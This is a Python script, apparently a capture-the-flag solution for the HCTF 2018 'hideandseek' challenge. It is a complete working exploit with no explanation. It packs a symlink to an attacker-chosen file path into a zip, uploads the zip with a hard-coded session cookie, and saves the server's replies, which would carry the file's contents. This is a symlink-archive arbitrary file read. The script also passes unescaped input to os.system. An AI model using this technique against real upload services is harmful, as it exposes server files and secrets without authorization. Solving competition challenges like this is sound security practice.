import requests
import random 
import os
import string
import time
import zipfile
import sys

def generate_zip(path,i):
    zip_name =  'moxiaoxi'+str(i)+'.zip'
    link_namme = 'moxiaoxi'+str(i)
    os.system("ln -s {} {}".format(path,link_namme))
    print "ln -s {} {}".format(path,link_namme)
    os.system("zip -y {} {}".format(zip_name,link_namme))
    with open(zip_name,'r') as f:
        data = f.read()
    return zip_name,data



def exp(path,i):
    zip_name,data = generate_zip(path,i)
    # zip_name,data = rewrite(path,i)
    session = requests.Session()
    paramsPost = {"submit":"Submit"}
    paramsMultipart = [('the_file', (zip_name, data, 'application/zip'))]
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Linux; Android 9.0; SAMSUNG-SM-T377A Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36","Referer":"http://hideandseek.2018.hctf.io/","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","DNT":"1"}
    cookies = {"session":"eyJ1c2VybmFtZSI6Im1veGlhb3hpIn0.Dsf5zA.yM84QphtcfEoykAu2lwjxp7_QvI"}
    response = session.post("http://hideandseek.2018.hctf.io/upload", data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies)

    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)
    if len(response.content)>5:
        # print("Response body: %s" % response.content)
        with open('out.txt','a+') as f:
            f.write('\n\n{}\n\n{}'.format(path,response.content)) 


if __name__=='__main__':
    name =  'test'+''.join(random.sample(string.ascii_letters + string.digits, 4))
    exp(sys.argv[1],name)
